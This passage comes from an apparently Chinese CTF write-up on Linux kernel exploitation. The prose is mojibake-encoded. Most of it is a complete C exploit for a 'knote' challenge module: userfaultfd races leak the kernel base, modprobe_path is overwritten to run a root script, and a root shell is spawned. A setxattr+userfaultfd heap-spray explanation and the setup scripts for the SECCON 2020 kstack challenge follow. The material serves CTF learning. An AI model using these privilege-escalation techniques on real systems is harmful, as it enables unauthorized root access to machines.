class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> modprobe_path_offset 0x145c5c0</span></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> size;</span><br><span class="line">        <span class="keyword">size_t</span> idx;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x1337</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x2333</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    Chunk chunk=&#123;</span><br><span class="line">        .idx=idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line">    Chunk chunk =&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .data=data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x8888</span>,&amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> knote_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tty_fd=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_tty_struct_data</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">    tty_fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!tty_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/dev/ptmx open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] ptmx ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> modprobe_path_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_modprobe_path</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] object_next changeing&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    del(knote_fd,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] debug: %p\n&quot;</span>,debug);</span><br><span class="line">    <span class="keyword">char</span> get_flag[]=<span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/getshell&quot;</span>,O_RDWR|O_CREAT);</span><br><span class="line">    write(fd,get_flag,<span class="keyword">sizeof</span>(get_flag));</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *ptr1=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *ptr2=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line"></span><br><span class="line">    registerUserFaultFd(ptr1,page_size,fault_handler_thread);</span><br><span class="line">    registerUserFaultFd(ptr2,page_size,fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    knote_fd=open(<span class="string">&quot;/dev/knote&quot;</span>,O_RDWR);</span><br><span class="line">    add(knote_fd,tty_struct_size);</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,get_tty_struct_data,<span class="number">0</span>);</span><br><span class="line">    get(knote_fd,<span class="number">0</span>,ptr1);</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>))&#123;</span><br><span class="line">        kernel_base=*((<span class="keyword">size_t</span>*)(ptr1) + <span class="number">86</span>)<span class="number">-0x5d4ef0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] get kernel_base fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr=kernel_base+modprobe_path_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] modprobe_path_addr:%p\n&quot;</span>,modprobe_path_addr);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page,&amp;modprobe_path_addr, <span class="number">8</span>);</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_modprobe_path,<span class="number">0</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">0</span>,ptr2);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    add(knote_fd,<span class="number">0x60</span>);</span><br><span class="line">    edit(knote_fd,<span class="number">1</span>,<span class="string">&quot;/getshell&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flag_fd=open(<span class="string">&quot;/flag&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!flag_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;[\033[34m\033[1m*\033[0m] hack fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag_fd,flag,<span class="number">0x20</span>);</span><br><span class="line">    write(<span class="number">1</span>,flag,<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡å¦‚æ¶æ„è„šæœ¬æ˜¯<code>cat /flag</code>åœ¨ç»ˆç«¯æ˜¯æ²¡æœ‰æ˜¾ç¤ºçš„ï¼Œå¯èƒ½æœ€åæ‰§è¡Œ<code>call_usermodehelper_exec()</code>çš„æ—¶å€™å¯¹åº”çš„ç»ˆç«¯å·²ç»ä¸æ˜¯å½“å‰ç»ˆç«¯äº†ï¼Œæ‰€ä»¥å¾—æ‰§è¡Œ<code>chmod 777 flag</code>ç„¶åå†è¯»æ‰èƒ½å¾—åˆ°flag.</p>
<p><strong>ç»“æœ</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/fake: line 1: ï¿½ï¿½ï¿½ï¿½: not found</span><br><span class="line">[*] flag&#123;12345&#125;</span><br><span class="line">ok</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">/ $ ls -l flag</span></span><br><span class="line"><span class="string">-rwxrwxrwx    1 0        0               16 Jul 26 08:41 flag</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><strong>æ€»ç»“</strong></p>
<p>é€šè¿‡è¿™ä¸€é“é¢˜å¤§æ¦‚äº†äº†è§£äº†userfaultfdå’Œmodprobe_pathçš„æ€è·¯å’ŒåŸºæœ¬ç”¨æ³•ï¼Œæ”¶è·æ»¡æ»¡ã€‚</p>
<h2 id="setxattr-userfaultfdå †å ä½"><a href="#setxattr-userfaultfdå †å ä½" class="headerlink" title="setxattr+userfaultfdå †å ä½"></a>setxattr+userfaultfdå †å ä½</h2><p>å’Œsendmsgä¸€æ ·éƒ½æ˜¯å †å–·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸ªå †å†…æ ¸å †çš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œè€Œsendmsgç”³è¯·çš„å†…æ ¸å †çš„æœ€å°å­—èŠ‚æ˜¯44ï¼Œæ‰€ä»¥æ¯”èµ·sendmsgæ¥è¯´è¿™ä¸ªæ›´å…·æœ‰ä¸€èˆ¬æ€§ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨<code>setattr()</code>å‡½æ•°ä¸­valueå’Œsizeæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œå¹¶ä¸”å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„objectå¹¶å†™å…¥ï¼Œä½†è¯¥objectåœ¨setattræ‰§è¡Œç»“æŸä¼šè¢«é‡Šæ”¾ï¼Œè¢«é‡Šæ”¾åæˆ‘ä»¬å°±æ— æ³•æ§åˆ¶è¿™ä¸ªå †äº†ï¼Œä¸è¿‡å¥½åœ¨<code>setattr</code>å‡½æ•°æ˜¯åœ¨kmallocå®Œä¹‹åæ‰æ‰§è¡Œ<code>copy_from_user</code>å‡½æ•°ï¼Œè€Œ<code>user_from_user</code>å‡½æ•°å¯ä»¥é˜»å¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆmmapä¸€ä¸ªä¸¤é¡µå¤§å°çš„å†…å­˜ï¼Œç„¶åå‘ç¬¬ä¸€ä¸ªé¡µçš„æœ«å°¾å¡«å……æ•°æ®ï¼Œç¬¬äºŒé¡µå†ç”¨userfaultfdç¼ºé¡µå¤„ç†ï¼Œç„¶åæŠŠç¬¬ä¸€é¡µçš„æœ«å°¾ä¼ å…¥<code>setattr()</code>å‡½æ•°ï¼Œè¿™æ ·copyå®Œç¬¬ä¸€é¡µçš„æœ«å°¾åå†copyç¬¬äºŒé¡µçš„æ—¶å€™å°±ä¼šé™·å…¥ç¼ºé¡µä¸­æ–­äº†ï¼Œç„¶åå°±è¾¾åˆ°äº†chunkæ—¢å¯æ§åˆä¸ä¼šè¢«é‡Šæ”¾çš„ç›®çš„äº†ã€‚</p>
<p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="ç›—çš„å›¾"></p>
<h3 id="ä¾‹é¢˜-SECCON-2020-kstack"><a href="#ä¾‹é¢˜-SECCON-2020-kstack" class="headerlink" title="ä¾‹é¢˜ SECCON 2020 kstack"></a>ä¾‹é¢˜ SECCON 2020 kstack</h3><p>qemuå¯åŠ¨è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>

<p>å¼€äº†kaslrå’Œsmepï¼Œä¹Ÿå¼€äº†KPTI</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt;/dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">insmod /root/kstack.ko</span><br><span class="line">chmod 777 /proc/stack</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">cat /root/banner</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

